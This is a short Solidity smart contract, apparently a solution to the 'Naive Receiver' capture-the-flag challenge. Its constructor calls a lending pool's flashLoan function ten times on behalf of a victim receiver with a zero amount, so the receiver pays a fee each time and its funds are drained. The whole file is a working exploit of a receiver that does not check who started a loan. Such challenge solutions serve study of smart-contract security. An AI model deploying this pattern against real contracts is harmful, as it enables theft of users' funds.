// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackNaiveReceiver {
    using Address for address;

    address private constant token = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address pool, address receiver) {
        for (uint i = 0; i < 10; ) {
            pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    receiver,
                    token,
                    0,
                    bytes("")
                )
            );
            ++i;
        }
    }
}
